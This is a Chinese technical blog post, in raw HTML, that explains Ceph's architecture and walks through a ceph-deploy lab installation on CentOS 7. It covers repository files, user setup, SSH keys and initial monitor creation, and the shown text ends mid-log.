title="Ceph&#x76F8;&#x5173;"></a>Ceph&#x76F8;&#x5173;</h3><ul><li>Ceph&#x662F;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF08;object&#xFF09;&#x5F0F;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#xFF0C;&#x5B83;&#x628A;&#x6BCF;&#x4E00;&#x4E2A;&#x5F85;&#x7BA1;&#x7406;&#x7684;&#x6570;&#x636E;&#x6D41;&#xFF08;&#x4F8B;&#x5982;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF09;&#x5207;&#x5206;&#x4E3A;&#x4E00;&#x4E2A;&#x5230;&#x591A;&#x4E2A;&#x56FA;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4EE5;&#x5176;&#x4E3A;&#x539F;&#x5B50;&#x5355;&#x5143;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x5B58;&#x53D6;&#x3002;</li><li>&#x5BF9;&#x8C61;&#x6570;&#x636E;&#x7684;&#x5E95;&#x5C42;&#x5B58;&#x50A8;&#x670D;&#x52A1;&#x662F;&#x7531;&#x591A;&#x4E2A;&#x4E3B;&#x673A;&#xFF08;host&#xFF09;&#x7EC4;&#x6210;&#x7684;&#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#xFF0C;&#x8BE5;&#x96C6;&#x7FA4;&#x4E5F;&#x88AB;&#x79F0;&#x4E3A;RADOS&#xFF08;Reliable Automatic Distributed Object Store&#xFF09;&#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#xFF0C;&#x53CA;&#x53EF;&#x9760;&#x81EA;&#x52A8;&#x5316;&#x5206;&#x5E03;&#x5F0F;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x3002;</li><li>librados&#x662F;RADOS&#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x7684;API&#xFF0C;&#x5B83;&#x652F;&#x6301;C&#x3001;C++&#x3001;Java&#x3001;Python&#x3001;Ruby&#x548C;PHP&#x7B49;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;</li></ul><p>&#x4E0D;&#x7BA1;&#x4F60;&#x662F;&#x60F3;&#x4E3A;&#x4E91;&#x5E73;&#x53F0;&#x63D0;&#x4F9B;Ceph &#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x548C;/&#x6216; Ceph &#x5757;&#x8BBE;&#x5907;&#xFF0C;&#x8FD8;&#x662F;&#x60F3;&#x90E8;&#x7F72;&#x4E00;&#x4E2A; Ceph &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x628A; Ceph &#x4F5C;&#x4E3A;&#x4ED6;&#x7528;&#xFF0C;&#x6240;&#x6709; Ceph &#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x7684;&#x90E8;&#x7F72;&#x90FD;&#x59CB;&#x4E8E;&#x90E8;&#x7F72;&#x4E00;&#x4E2A;&#x4E2A; Ceph &#x8282;&#x70B9;&#x3001;&#x7F51;&#x7EDC;&#x548C; Ceph &#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x3002; Ceph &#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x81F3;&#x5C11;&#x9700;&#x8981;&#x4E00;&#x4E2A; Ceph Monitor &#x548C;&#x4E24;&#x4E2A; OSD &#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x3002;&#x800C;&#x8FD0;&#x884C; Ceph &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x5BA2;&#x6237;&#x7AEF;&#x65F6;&#xFF0C;&#x5219;&#x5FC5;&#x987B;&#x8981;&#x6709;&#x5143;&#x6570;&#x636E;&#x670D;&#x52A1;&#x5668;&#xFF08; Metadata Server &#xFF09;&#x3002;</p><p><strong>Ceph OSDs</strong>: Ceph OSD &#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF08; Ceph OSD &#xFF09;&#x7684;&#x529F;&#x80FD;&#x662F;<strong>&#x5B58;&#x50A8;&#x6570;&#x636E;&#xFF0C;&#x5904;&#x7406;&#x6570;&#x636E;&#x7684;&#x590D;&#x5236;&#x3001;&#x6062;&#x590D;&#x3001;&#x56DE;&#x586B;&#x3001;&#x518D;&#x5747;&#x8861;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x68C0;&#x67E5;&#x5176;&#x4ED6;OSD &#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x7684;&#x5FC3;&#x8DF3;&#x6765;&#x5411; Ceph Monitors &#x63D0;&#x4F9B;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x4FE1;&#x606F;</strong>&#x3002;&#x5F53; Ceph &#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x8BBE;&#x5B9A;&#x4E3A;&#x6709;2&#x4E2A;&#x526F;&#x672C;&#x65F6;&#xFF0C;&#x81F3;&#x5C11;&#x9700;&#x8981;2&#x4E2A; OSD &#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x96C6;&#x7FA4;&#x624D;&#x80FD;&#x8FBE;&#x5230; active+clean &#x72B6;&#x6001;&#xFF08; Ceph &#x9ED8;&#x8BA4;&#x6709;3&#x4E2A;&#x526F;&#x672C;&#xFF0C;&#x4F46;&#x4F60;&#x53EF;&#x4EE5;&#x8C03;&#x6574;&#x526F;&#x672C;&#x6570;&#xFF09;&#x3002;</p><p><strong>Monitors</strong>: Ceph Monitor<strong>&#x7EF4;&#x62A4;&#x7740;&#x5C55;&#x793A;&#x96C6;&#x7FA4;&#x72B6;&#x6001;&#x7684;&#x5404;&#x79CD;&#x56FE;&#x8868;</strong>&#xFF0C;&#x5305;&#x62EC;&#x76D1;&#x89C6;&#x5668;&#x56FE;&#x3001; OSD &#x56FE;&#x3001;&#x5F52;&#x7F6E;&#x7EC4;&#xFF08; PG &#xFF09;&#x56FE;&#x3001;&#x548C; CRUSH &#x56FE;&#x3002; Ceph &#x4FDD;&#x5B58;&#x7740;&#x53D1;&#x751F;&#x5728;Monitors &#x3001; OSD &#x548C; PG&#x4E0A;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x72B6;&#x6001;&#x53D8;&#x66F4;&#x7684;&#x5386;&#x53F2;&#x4FE1;&#x606F;&#xFF08;&#x79F0;&#x4E3A; epoch &#xFF09;&#x3002;</p><p><strong>MDSs</strong>: Ceph &#x5143;&#x6570;&#x636E;&#x670D;&#x52A1;&#x5668;&#xFF08; MDS &#xFF09;&#x4E3A; Ceph &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x5B58;&#x50A8;&#x5143;&#x6570;&#x636E;&#xFF08;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;Ceph &#x5757;&#x8BBE;&#x5907;&#x548C; Ceph &#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x4E0D;&#x4F7F;&#x7528;MDS &#xFF09;&#x3002;&#x5143;&#x6570;&#x636E;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x5F97; POSIX &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x7528;&#x6237;&#x4EEC;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x5BF9; Ceph &#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x9020;&#x6210;&#x8D1F;&#x62C5;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x6267;&#x884C;&#x8BF8;&#x5982; ls&#x3001;find &#x7B49;&#x57FA;&#x672C;&#x547D;&#x4EE4;&#x3002;</p><p>Ceph &#x628A;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x4E3A;&#x5B58;&#x50A8;&#x6C60;&#x5185;&#x7684;&#x5BF9;&#x8C61;&#x3002;&#x901A;&#x8FC7;&#x4F7F;&#x7528; CRUSH &#x7B97;&#x6CD5;&#xFF0C; Ceph &#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x51FA;&#x54EA;&#x4E2A;&#x5F52;&#x7F6E;&#x7EC4;&#xFF08;PG&#xFF09;&#x5E94;&#x8BE5;&#x6301;&#x6709;&#x6307;&#x5B9A;&#x7684;&#x5BF9;&#x8C61;(Object)&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x4E00;&#x6B65;&#x8BA1;&#x7B97;&#x51FA;&#x54EA;&#x4E2A; OSD &#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x6301;&#x6709;&#x8BE5;&#x5F52;&#x7F6E;&#x7EC4;&#x3002; CRUSH &#x7B97;&#x6CD5;&#x4F7F;&#x5F97; Ceph &#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x80FD;&#x591F;&#x52A8;&#x6001;&#x5730;&#x4F38;&#x7F29;&#x3001;&#x518D;&#x5747;&#x8861;&#x548C;&#x4FEE;&#x590D;&#x3002;</p><p><strong>Ceph&#x67B6;&#x6784;</strong><br><img src="http://192.168.84.188:8081/uploads/1655038820449485585ceph_str.png" alt=""></p><p><img src="http://192.168.84.188:8081/uploads/1655038854435445522ceph_str2.png" alt=""></p><p><strong>&#x4F53;&#x7CFB;&#x7ED3;&#x6784;</strong><br>Ceph &#x7528;&#x7EDF;&#x4E00;&#x7684;&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x8C61;&#x3001;&#x5757;&#x3001;&#x548C;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x529F;&#x80FD;&#xFF0C;&#x5B83;&#x53EF;&#x9760;&#x6027;&#x9AD8;&#x3001;&#x7BA1;&#x7406;&#x7B80;&#x4FBF;&#x3001;&#x5E76;&#x4E14;&#x662F;&#x81EA;&#x7531;&#x8F6F;&#x4EF6;&#x3002; Ceph &#x7684;&#x5F3A;&#x5927;&#x8DB3;&#x4EE5;&#x6539;&#x53D8;&#x8D35;&#x516C;&#x53F8;&#x7684; IT &#x57FA;&#x7840;&#x67B6;&#x6784;&#x3001;&#x548C;&#x7BA1;&#x7406;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x7684;&#x80FD;&#x529B;&#x3002;Ceph &#x53EF;&#x63D0;&#x4F9B;&#x6781;&#x5927;&#x7684;&#x4F38;&#x7F29;&#x6027;&#x2014;&#x2014;&#x4F9B;&#x6210;&#x5343;&#x7528;&#x6237;&#x8BBF;&#x95EE; PB &#x4E43;&#x81F3; EB &#x7EA7;&#x7684;&#x6570;&#x636E;&#x3002; Ceph &#x8282;&#x70B9;&#x4EE5;&#x666E;&#x901A;&#x786C;&#x4EF6;&#x548C;&#x667A;&#x80FD;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x4F5C;&#x4E3A;&#x652F;&#x6491;&#x70B9;&#xFF0C; Ceph &#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x7EC4;&#x7EC7;&#x8D77;&#x4E86;&#x5927;&#x91CF;&#x8282;&#x70B9;&#xFF0C;&#x5B83;&#x4EEC;&#x4E4B;&#x95F4;&#x9760;&#x76F8;&#x4E92;&#x901A;&#x8BAF;&#x6765;&#x590D;&#x5236;&#x6570;&#x636E;&#x3001;&#x5E76;&#x52A8;&#x6001;&#x5730;&#x91CD;&#x5206;&#x5E03;&#x6570;&#x636E;&#x3002;</p><p><img src="http://192.168.84.188:8081/uploads/1655039042670905246ceph_struc.png" alt=""></p><h2 id="&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x65B9;&#x6848;&#x2014;&#x2014;Ceph"><a href="#&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x65B9;&#x6848;&#x2014;&#x2014;Ceph" class="headerlink" title="&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x65B9;&#x6848;&#x2014;&#x2014;Ceph"></a>&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x65B9;&#x6848;&#x2014;&#x2014;Ceph</h2><p><strong>&#x73AF;&#x5883;</strong><br>Server01 <code>192.168.110.10</code>&#x3001;Ceph Admin<br>Server02 <code>192.168.110.11</code>&#x3001;monitor&#x3001;mgr<br>Server03 <code>192.168.110.12</code>&#x3001;monitor&#x3001;mgr<br>Server04 <code>192.168.110.13</code>&#x3001;monitor&#x3001;mgr<br>&#x8BF4;&#x660E;&#xFF1A;server02-0&#x662F;Ceph&#x5B58;&#x50A8;&#x96C6;&#x7FA4;&#x8282;&#x70B9;&#xFF0C;&#x5B83;&#x4EEC;&#x5206;&#x522B;&#x4F5C;&#x4E3A;MON&#x8282;&#x70B9;&#x548C;OSD&#x8282;&#x70B9;&#xFF0C;&#x5404;&#x81EA;&#x62E5;&#x6709;&#x4E13;&#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x78C1;&#x76D8;&#x8BBE;&#x5907;/dev/sdb&#x548C;/dev/sdc&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x5747;&#x4E3A;RHEL7&#x6216;&#x8005;CentOS7&#x800C;ceph-admin&#x4E3B;&#x673A;&#x662F;&#x4E3A;&#x7BA1;&#x7406;&#x8282;&#x70B9;&#xFF0C;&#x7528;&#x4E8E;&#x90E8;&#x7F72;ceph-deploy&#x3002;</p><h3 id="&#x57FA;&#x7840;&#x73AF;&#x5883;&#x51C6;&#x5907;"><a href="#&#x57FA;&#x7840;&#x73AF;&#x5883;&#x51C6;&#x5907;" class="headerlink" title="&#x57FA;&#x7840;&#x73AF;&#x5883;&#x51C6;&#x5907;"></a>&#x57FA;&#x7840;&#x73AF;&#x5883;&#x51C6;&#x5907;</h3><p>&#x501F;&#x52A9;&#x4E8E;NTP&#x670D;&#x52A1;&#x8BBE;&#x5B9A;&#x5404;&#x8282;&#x70B9;&#x65F6;&#x95F4;&#x7CBE;&#x786E;&#x540C;&#x6B65;&#xFF1B;<br>&#x901A;&#x8FC7;DNS&#x5B8C;&#x6210;&#x5404;&#x8282;&#x70B9;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x89E3;&#x6790;&#xFF0C;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#x4E3B;&#x673A;&#x6570;&#x91CF;&#x8F83;&#x5C11;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;hosts&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#xFF1B;<br>&#x5173;&#x95ED;&#x5404;&#x8282;&#x70B9;&#x7684;iptables&#x6216;firewalld&#x670D;&#x52A1;&#xFF0C;&#x5E76;&#x786E;&#x4FDD;&#x5B83;&#x4EEC;&#x88AB;&#x7981;&#x6B62;&#x968F;&#x7CFB;&#x7EDF;&#x5F15;&#x5BFC;&#x8FC7;&#x7A0B;&#x542F;&#x52A8;&#xFF1B;<br>&#x5404;&#x8282;&#x70B9;&#x7981;&#x7528;SELinux&#xFF1B;  </p><p>&#x8BBE;&#x5B9A;&#x65F6;&#x949F;&#x540C;&#x6B65;</p><pre><code>cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</code></pre><p><strong>&#x4F18;&#x5316;&#x7CFB;&#x7EDF;</strong></p><pre><code class="bash">sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalld &amp;&gt; /dev/nullsystemctl disable firewalld &amp;&gt; /dev/nulliptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/nullecho 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><pre><code class="bash">echo -e &quot;192.168.110.10\tserver10&quot; &gt;&gt; /etc/hostsecho -e &quot;192.168.110.11\tserver11&quot; &gt;&gt; /etc/hostsecho -e &quot;192.168.110.12\tserver12&quot; &gt;&gt; /etc/hostsecho -e &quot;192.168.110.13\tserver13&quot; &gt;&gt; /etc/hosts</code></pre><p><strong>&#x521B;&#x5EFA;&#x90E8;&#x7F72;Ceph&#x7684;&#x7279;&#x5B9A;&#x8D26;&#x53F7;</strong><br>&#x90E8;&#x7F72;&#x5DE5;&#x5177;ceph-deploy &#x5FC5;&#x987B;&#x4EE5;&#x666E;&#x901A;&#x7528;&#x6237;&#x767B;&#x5F55;&#x5230;Ceph&#x96C6;&#x7FA4;&#x7684;&#x5404;&#x76EE;&#x6807;&#x8282;&#x70B9;&#xFF0C;&#x4E14;&#x6B64;&#x7528;&#x6237;&#x9700;&#x8981;&#x62E5;&#x6709;&#x65E0;&#x5BC6;&#x7801;&#x4F7F;&#x7528;sudo&#x547D;&#x4EE4;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x4EE5;&#x4FBF;&#x5728;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x53CA;&#x751F;&#x6210;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x65E0;&#x9700;&#x4E2D;&#x65AD;&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;&#x3002;&#x4E0D;&#x8FC7;&#xFF0C;&#x8F83;&#x65B0;&#x7248;&#x7684;ceph-deploy&#x4E5F;&#x652F;&#x6301;&#x7528; &#x201D;&#x2013;username&#x201C; &#x9009;&#x9879;&#x63D0;&#x4F9B;&#x53EF;&#x65E0;&#x5BC6;&#x7801;&#x4F7F;&#x7528;sudo&#x547D;&#x4EE4;&#x7684;&#x7528;&#x6237;&#x540D;&#xFF08;&#x5305;&#x62EC; root &#xFF0C;&#x4F46;&#x4E0D;&#x5EFA;&#x8BAE;&#x8FD9;&#x6837;&#x505A;&#xFF09;&#x3002;<br>&#x53E6;&#x5916;&#xFF0C;&#x4F7F;&#x7528;&#x201D;ceph-deploy &#x2013;username {username} &#x201C;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x6307;&#x5B9A;&#x7684;&#x7528;&#x6237;&#x9700;&#x8981;&#x80FD;&#x591F;&#x901A;&#x8FC7;SSH&#x534F;&#x8BAE;&#x81EA;&#x52A8;&#x8BA4;&#x8BC1;&#x5E76;&#x8FDE;&#x63A5;&#x5230;&#x5404;Ceph&#x8282;&#x70B9;&#xFF0C;&#x4EE5;&#x514D;ceph-deploy&#x547D;&#x4EE4;&#x5728;&#x914D;&#x7F6E;&#x4E2D;&#x9014;&#x9700;&#x8981;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x3002;</p><p><strong>&#x5728;&#x5404;Ceph&#x8282;&#x70B9;&#x521B;&#x5EFA;&#x65B0;&#x7528;&#x6237;</strong><br>&#x9996;&#x5148;&#x9700;&#x8981;&#x5728;&#x5404;&#x8282;&#x70B9;&#x4EE5;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x8EAB;&#x4EFD;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x4E13;&#x7528;&#x4E8E;ceph-deploy&#x7684;&#x7279;&#x5B9A;&#x7528;&#x6237;&#x8D26;&#x53F7;&#xFF0C;&#x4F8B;&#x5982;cephadm&#xFF08;&#x5EFA;&#x8BAE;&#x4E0D;&#x8981;&#x4F7F;&#x7528;ceph&#xFF09;&#xFF0C;&#x5E76;&#x4E3A;&#x5176;&#x8BBE;&#x7F6E;&#x8BA4;&#x8BC1;&#x5BC6;&#x7801;&#xFF08;&#x4F8B;&#x5982;Cephpasswd&#xFF09;&#xFF1A;<br>&#x7136;&#x540E;&#xFF0C;&#x786E;&#x4FDD;&#x8FD9;&#x4E9B;&#x8282;&#x70B9;&#x4E0A;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x7528;&#x6237;cephadm&#x90FD;&#x6709;&#x65E0;&#x5BC6;&#x7801;&#x8FD0;&#x884C;sudo&#x547D;&#x4EE4;&#x7684;&#x6743;&#x9650;&#x3002;</p><pre><code class="bash">useradd cephadmecho CephPasswd | passwd --stdin cephadmvisudo## Allow root to run any commands anywhereroot    ALL=(ALL)       ALLcephadm ALL=(ALL)       NOPASSWD:ALL</code></pre><p><strong>&#x914D;&#x7F6E;&#x597D;&#x7F51;&#x7EDC;&#x6E90;</strong>   </p><p>yum&#x6E90;</p><pre><code class="bash"># CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client.  You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the# remarked out baseurl= line instead.## CentOS-Base.repo[base]name=CentOS-$releasever - Base#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infrabaseurl=https://mirrors.ustc.edu.cn/centos/$releasever/os/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7#released updates[updates]name=CentOS-$releasever - Updates#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates&amp;infra=$infrabaseurl=https://mirrors.ustc.edu.cn/centos/$releasever/updates/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7#additional packages that may be useful[extras]name=CentOS-$releasever - Extras#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infrabaseurl=https://mirrors.ustc.edu.cn/centos/$releasever/extras/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7#additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus&amp;infra=$infrabaseurl=https://mirrors.ustc.edu.cn/centos/$releasever/centosplus/$basearch/gpgcheck=1enabled=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</code></pre><p>epel&#x6E90;</p><pre><code class="bash"># epel.repo[epel]name=Extra Packages for Enterprise Linux 7 - $basearchbaseurl=https://mirrors.ustc.edu.cn/epel/7/$basearch#metalink=https://mirrors.fedoraproject.org/metalink?repo=epel-7&amp;arch=$basearchfailovermethod=priorityenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7[epel-debuginfo]name=Extra Packages for Enterprise Linux 7 - $basearch - Debugbaseurl=https://mirrors.ustc.edu.cn/epel/7/$basearch/debug#metalink=https://mirrors.fedoraproject.org/metalink?repo=epel-debug-7&amp;arch=$basearchfailovermethod=priorityenabled=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7gpgcheck=1[epel-source]name=Extra Packages for Enterprise Linux 7 - $basearch - Sourcebaseurl=https://mirrors.ustc.edu.cn/epel/7/SRPMS#metalink=https://mirrors.fedoraproject.org/metalink?repo=epel-source-7&amp;arch=$basearchfailovermethod=priorityenabled=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7gpgcheck=1</code></pre><pre><code class="bash">sudo sed -e &apos;s|^mirrorlist=|#mirrorlist=|g&apos; \         -e &apos;s|^#baseurl=http://mirrors.ustc.edu.cn/ceph/|baseurl=https://mirrors.ustc.edu.cn/ceph|g&apos; \         -i.bak \         /etc/yum.repos.d/ceph.repo</code></pre><pre><code class="bash"># ceph.repo[Ceph]name=Ceph packages for $basearchbaseurl=https://mirrors.ustc.edu.cn/ceph/rpm-mimic/el7/$basearchenabled=1gpgcheck=1type=rpm-mdgpgkey=https://mirrors.ustc.edu.cn/ceph/keys/release.asc[Ceph-noarch]name=Ceph noarch packagesbaseurl=https://mirrors.ustc.edu.cn/ceph/rpm-mimic/el7/noarchenabled=1gpgcheck=1type=rpm-mdgpgkey=https://mirrors.ustc.edu.cn/ceph/keys/release.asc[ceph-source]name=Ceph source packagesbaseurl=https://mirrors.ustc.edu.cn/ceph/rpm-mimic/el7/SRPMSenabled=1gpgcheck=1type=rpm-mdgpgkey=https://mirrors.ustc.edu.cn/ceph/keys/release.asc</code></pre><p><strong>&#x4F9D;&#x8D56;&#x5305;&#x5B89;&#x88C5;</strong></p><pre><code>yum install yum-plugin-prioritiesyum install -y snappy leveldb gdisk python-argparse gperftools-libs</code></pre><p><strong>&#x786E;&#x4FDD;<code>priorities.conf</code>&#x542F;&#x7528;</strong></p><pre><code>[main]enabled = 1</code></pre><h3 id="&#x521D;&#x59CB;&#x5316;RADOS&#x96C6;&#x7FA4;"><a href="#&#x521D;&#x59CB;&#x5316;RADOS&#x96C6;&#x7FA4;" class="headerlink" title="&#x521D;&#x59CB;&#x5316;RADOS&#x96C6;&#x7FA4;"></a>&#x521D;&#x59CB;&#x5316;RADOS&#x96C6;&#x7FA4;</h3><p><strong>&#x914D;&#x7F6E;&#x7528;&#x6237;&#x57FA;&#x4E8E;&#x5BC6;&#x94A5;&#x7684;ssh&#x8BA4;&#x8BC1;</strong><br>ceph-deploy&#x547D;&#x4EE4;&#x4E0D;&#x652F;&#x6301;&#x8FD0;&#x884C;&#x4E2D;&#x9014;&#x7684;&#x5BC6;&#x7801;&#x8F93;&#x5165;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5FC5;&#x987B;&#x5728;&#x7BA1;&#x7406;&#x8282;&#x70B9;&#xFF08;ceph-admin.magedu.com&#xFF09;&#x4E0A;&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;&#x5E76;&#x5C06;&#x5176;&#x516C;&#x94A5;&#x5206;&#x53D1;&#x81F3;Ceph&#x96C6;&#x7FA4;&#x7684;&#x5404;&#x8282;&#x70B9;&#x4E0A;&#x3002;&#x4E0B;&#x9762;&#x76F4;&#x63A5;&#x4EE5;cephadm&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x751F;&#x6210;SSH&#x5BC6;&#x94A5;&#x5BF9;&#xFF1A;</p><pre><code class="bash">su - cephadmssh-keygen -t rsa -P &quot;&quot;ssh-copy-id -i .ssh/id_rsa.pub cephadm@192.168.110.11ssh-copy-id -i .ssh/id_rsa.pub cephadm@192.168.110.12ssh-copy-id -i .ssh/id_rsa.pub cephadm@192.168.110.13</code></pre><p> &#x53E6;&#x5916;&#xFF0C;&#x4E3A;&#x4E86;&#x540E;&#x7EED;&#x64CD;&#x4F5C;&#x4E4B;&#x4FBF;&#xFF0C;&#x5EFA;&#x8BAE;&#x4FEE;&#x6539;&#x7BA1;&#x7406;&#x8282;&#x70B9;&#x4E0A;cephadm&#x7528;&#x6237;&#x7684; ~/.ssh/config &#x6587;&#x4EF6;&#xFF0C;&#x8BBE;&#x5B9A;&#x5176;&#x8BBF;&#x95EE;Ceph&#x96C6;&#x7FA4;&#x5404;&#x8282;&#x70B9;&#x65F6;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x7684;&#x7528;&#x6237;&#x540D;&#x4E3A;&#xFF0C;&#x4ECE;&#x800C;&#x907F;&#x514D;&#x6BCF;&#x6B21;&#x6267;&#x884C;ceph-deploy&#x547D;&#x4EE4;&#x65F6;&#x90FD;&#x8981;&#x6307;&#x5B9A; &#x4F7F;&#x7528;&#x201D;&#x2013;username&#x201C;&#x9009;&#x9879;&#x8BBE;&#x7F6E;&#x4F7F;&#x7528;&#x7684;&#x7528;&#x6237;&#x540D;&#x3002;</p><pre><code>vim ~/.ssh/configchmod 600 ~/.ssh/conf</code></pre><pre><code class="ini">host 192.168.110.11    hostname server11    user cephadmhost 192.168.110.12    hostname server12    user cephadmhost 192.168.110.13    hostname server13    user cephadm</code></pre><pre><code class="bash">yum install -y ceph ceph-osd ceph-mds ceph-mon ceph-radosgw ceph-deploy python-setuptools python2-subprocess32 python-pip[cephadm@server10 ~]$ cephceph                   ceph-dencoder          ceph-kvstore-tool      ceph-osdomap-toolceph-authtool          ceph-deploy            ceph-mds               ceph-post-fileceph-bluestore-tool    ceph-detect-init       ceph-mgr               ceph-rbdnamerceph-clsinfo           ceph-disk              ceph-mon               ceph-runceph-conf              cephfs-data-scan       ceph-monstore-tool     ceph-synceph-crash             cephfs-journal-tool    ceph-objectstore-tool  ceph-volumeceph-create-keys       cephfs-table-tool      ceph-osd               ceph-volume-systemd[cephadm@server10 ~]$ ceph</code></pre><p><strong>&#x521D;&#x59CB;&#x5316;&#x7B2C;&#x4E00;&#x4E2A;Monitor&#x8282;&#x70B9;&#xFF0C;&#x51C6;&#x5907;&#x521B;&#x5EFA;&#x96C6;&#x7FA4;</strong></p><pre><code>[cephadm@server10 ~]$ cd ceph-cluster/[cephadm@server10 ~]$ sudo ceph-deploy new server11[ceph_deploy.conf][DEBUG ] found configuration file at: /root/.cephdeploy.conf[ceph_deploy.cli][INFO  ] Invoked (2.0.1): /bin/ceph-deploy new server11[ceph_deploy.cli][INFO  ] ceph-deploy options:[ceph_deploy.cli][INFO  ]  username                      : None[ceph_deploy.cli][INFO  ]  func                          : &lt;function new at 0xb24c80&gt;[ceph_deploy.cli][INFO  ]  verbose                       : False[ceph_deploy.cli][INFO  ]  overwrite_conf                : False[ceph_deploy.cli][INFO  ]  quiet                         : False[ceph_deploy.cli][INFO  ]  cd_conf                       : &lt;ceph_deploy.conf.cephdeploy.Conf instance at 0xb88440&gt;[ceph_deploy.cli][INFO  ]  cluster                       : ceph[ceph_deploy.cli][INFO  ]  ssh_copykey                   : True[ceph_deploy.cli][INFO  ]  mon                           : [&apos;server11&apos;][ceph_deploy.cli][INFO  ]  public_network                : None[ceph_deploy.cli][INFO  ]  ceph_conf                     : None[ceph_deploy.cli][INFO  ]  cluster_network               : None[ceph_deploy.cli][INFO  ]  default_release               : False[ceph_deploy.cli][INFO  ]  fsid                          : None[ceph_deploy.new][DEBUG ] Creating 